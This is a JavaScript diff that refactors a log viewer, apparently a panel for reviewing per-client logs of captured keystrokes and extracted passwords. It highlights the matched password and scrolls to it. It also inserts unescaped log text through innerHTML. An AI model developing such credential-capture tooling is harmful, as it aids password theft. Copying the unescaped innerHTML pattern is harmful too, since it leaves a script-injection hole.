@@ -630,58 +630,146 @@ async function viewLog(clientId, filename) {
     }
 }
 
-// 查看日志内容并滚动到包含密码的行
 // 查看日志内容并滚动到包含原始密码数据的行
 async function viewLogWithPassword(clientId, filename, password, rawPassword) {
     try {
-        const response = await fetch(`/api/clients/${clientId}/logs/${filename}/raw`);
+        // 1. 获取日志内容
+        const content = await fetchLogContent(clientId, filename);
         
-        if (!response.ok) {
-            throw new Error(`服务器返回错误: ${response.status}`);
-        }
-        
-        const content = await response.text();
+        // 2. 更新标题
         document.getElementById('logModalTitle').textContent = filename;
         
-        // 创建高亮HTML内容：仅高亮原始数据（如果存在），否则高亮解析后的密码
-        let highlightedContent = content;
+        // 3. 生成高亮内容
+        const highlightedContent = generateHighlightedContent(content, password, rawPassword);
         
-        if (rawPassword) {
-            // 仅高亮原始按键序列，转义正则特殊字符
-            const escapedRawPassword = rawPassword.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
-            highlightedContent = highlightedContent.replace(
-                new RegExp(escapedRawPassword, 'g'), 
-                `<span class="raw-password-highlight">${rawPassword}</span>`
-            );
-        } else {
-            // 如果没有原始数据，才高亮解析后的密码（兜底），转义正则特殊字符
-            const escapedPassword = password.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
-            highlightedContent = highlightedContent.replace(
-                new RegExp(escapedPassword, 'g'), 
-                `<span class="password-highlight">${password}</span>`
-            );
-        }
-        
-        // 使用 innerHTML 支持高亮样式
+        // 4. 更新 DOM
         document.getElementById('logContent').innerHTML = highlightedContent;
         document.getElementById('logModal').classList.add('show');
         
-        // 滚动到第一个高亮位置（优先原始数据）
-        setTimeout(() => {
-            let highlight = document.querySelector('.raw-password-highlight') || document.querySelector('.password-highlight');
-            if (highlight) {
-                highlight.scrollIntoView({ behavior: 'smooth', block: 'center' });
-                // 添加闪烁效果
-                highlight.classList.add('blink');
-                setTimeout(() => {
-                    highlight.classList.remove('blink');
-                }, 2000);
-            }
-        }, 100);
+        // 5. 滚动到高亮位置
+        scrollToHighlight(rawPassword);
+        
     } catch (e) {
         console.error('查看日志失败:', e);
         showToast('查看失败，文件可能不存在或已被删除', 'error');
     }
+}
+
+// 添加闪烁效果
+function addBlinkEffect(element) {
+    element.classList.add('blink');
+    setTimeout(() => {
+        element.classList.remove('blink');
+    }, 2000);
+}
+
+// 滚动到文本位置
+function scrollToTextPosition(text) {
+    if (!text) return;
+    
+    const contentElement = document.getElementById('logContent');
+    const contentText = contentElement.textContent;
+    
+    // 尝试精确匹配
+    let index = contentText.indexOf(text);
+    
+    // 如果精确匹配失败，尝试部分匹配（去掉首尾空格）
+    if (index === -1) {
+        const trimmedText = text.trim();
+        if (trimmedText) {
+            index = contentText.indexOf(trimmedText);
+        }
+    }
+    
+    // 如果部分匹配也失败，尝试模糊匹配（忽略空格差异）
+    if (index === -1) {
+        const normalizedText = text.replace(/\s+/g, ' ').trim();
+        const normalizedContent = contentText.replace(/\s+/g, ' ').trim();
+        index = normalizedContent.indexOf(normalizedText);
+    }
+    
+    if (index !== -1) {
+        contentElement.scrollTop = 0;
+        // 计算更精确的滚动位置
+        const lineHeight = 16; // 估算行高
+        const lines = contentText.substring(0, index).split('\n').length;
+        const scrollPosition = Math.max(0, (lines - 5) * lineHeight); // 滚动到匹配位置上方5行
+        contentElement.scrollTop = scrollPosition;
+    }
+}
+
+// 滚动到高亮位置
+function scrollToHighlight(rawPassword) {
+    setTimeout(() => {
+        const highlight = document.querySelector('.raw-password-highlight') || 
+                         document.querySelector('.password-highlight');
+        
+        if (highlight) {
+            highlight.scrollIntoView({ behavior: 'smooth', block: 'center' });
+            addBlinkEffect(highlight);
+        } else if (rawPassword) {
+            scrollToTextPosition(rawPassword);
+        }
+    }, 100);
+}
+
+// 高亮密码
+function highlightPassword(content, password, className) {
+    if (!password) return content;
+    
+    // 先尝试直接字符串替换（更可靠）
+    if (content.includes(password)) {
+        return content.replace(
+            password, 
+            `<span class="${className}">${password}</span>`
+        );
+    }
+    
+    // 如果字符串替换失败，尝试正则表达式替换
+    try {
+        const escapedPassword = escapeRegexSpecialChars(password);
+        return content.replace(
+            new RegExp(escapedPassword, 'g'), 
+            `<span class="${className}">${password}</span>`
+        );
+    } catch (e) {
+        console.warn('正则匹配失败:', e);
+        return content;
+    }
+}
+
+// 生成高亮内容
+function generateHighlightedContent(content, password, rawPassword) {
+    let highlightedContent = content;
+    
+    if (rawPassword) {
+        highlightedContent = highlightPassword(highlightedContent, rawPassword, 'raw-password-highlight');
+        
+        // 如果原始密码高亮失败，尝试高亮解析后的密码
+        if (highlightedContent === content) {
+            highlightedContent = highlightPassword(highlightedContent, password, 'password-highlight');
+        }
+    } else {
+        highlightedContent = highlightPassword(highlightedContent, password, 'password-highlight');
+    }
+    
+    return highlightedContent;
+}
+
+// 转义正则表达式特殊字符
+function escapeRegexSpecialChars(str) {
+    return str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+}
+
+// 获取日志内容
+async function fetchLogContent(clientId, filename) {
+    const response = await fetch(`/api/clients/${clientId}/logs/${filename}/raw`);
+    
+    if (!response.ok) {
+        throw new Error(`服务器返回错误: ${response.status}`);
+    }
+    
+    return await response.text();
 }
 
 // 下载日志
